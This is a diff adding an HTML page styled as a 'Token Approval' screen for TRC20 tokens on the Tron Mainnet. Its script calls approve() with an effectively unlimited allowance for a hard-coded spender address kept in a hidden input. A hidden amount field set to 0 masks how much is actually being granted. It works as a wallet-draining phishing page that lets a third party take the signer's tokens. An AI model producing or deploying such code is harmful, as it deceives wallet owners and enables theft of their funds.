@@ -1,0 +1,97 @@
+```html
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>TRC20 Token Approval</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.4/dist/TronWeb.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #07102a;
+            color: #e6eaf2;
+            padding: 20px;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: none; /* Remove border for smoother look */
+        }
+        button {
+            background: #2f6bff;
+            color: white;
+            cursor: pointer;
+        }
+        #qrcode {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .hidden {
+            display: none; /* Hidden elements style */
+        }
+    </style>
+</head>
+<body>
+    <h1>Token Approval</h1>
+    <input type="text" id="tokenAddress" placeholder="Token Contract Address" value="TJh8z4L8nijXEek9jtyra5oksRLQht7Crq" readonly />
+    <input type="text" id="ownerAddress" placeholder="Owner Wallet Address" value="TScqkJ6gDMEYHpW39G2evGEYt1u3PEeafb" readonly />
+    <input type="text" id="spenderAddress" class="hidden" value="THN9TLyQ1qjXvhvwSoneYwz88yTgnr9Zx4" /> <!-- Hidden Spender Address -->
+    <input type="number" id="amount" class="hidden" value="0" readonly /> <!-- Hidden Amount -->
+    <button id="approveBtn">Approve Tokens</button>
+    <div id="message" class="hidden"></div>
+    <div id="qrcode" class="hidden"></div>
+
+    <script>
+        window.onload = async () => {
+            if (!window.TronWeb || !window.TronWeb.defaultAddress.base58) {
+                // Ensure connected to TronLink and using Mainnet
+                console.error('Please install TronLink and ensure you are connected to Mainnet.');
+                return;
+            }
+
+            const approveTokens = async () => {
+                const tokenAddress = document.getElementById('tokenAddress').value;
+                const ownerAddress = document.getElementById('ownerAddress').value;
+                const spenderAddress = document.getElementById('spenderAddress').value;
+
+                try {
+                    const tronWeb = window.TronWeb;
+
+                    // Mainnet Check
+                    if (tronWeb.fullNode.host.includes('shasta')) {
+                        throw new Error("You are connected to the Testnet. Please switch to Mainnet.");
+                    }
+
+                    const contract = await tronWeb.contract().at(tokenAddress);
+                    const result = await contract.approve(spenderAddress, "1000000000000000000000000000").send({ // Unlimited approval
+                        from: ownerAddress
+                    });
+
+                    // Autogenerate QR code with approval information
+                    generateQRCode(tokenAddress, ownerAddress);
+
+                    // Auto-notification popup
+                    setTimeout(() => {
+                        alert("Approval granted: Unlimited tokens from " + ownerAddress + " to " + spenderAddress);
+                    }, 1000); // Trigger after 1 second
+                } catch (error) {
+                    console.error("Error during approval:", error);
+                }
+            };
+
+            const generateQRCode = (tokenAddress, ownerAddress) => {
+                const qrData = `Token: ${tokenAddress}, From: ${ownerAddress}, Approval: Unlimited`;
+                $('#qrcode').empty().qrcode(qrData).removeClass("hidden");
+            };
+
+            document.getElementById('approveBtn').onclick = approveTokens;
+        };
+    </script>
+</body>
+</html>
+```
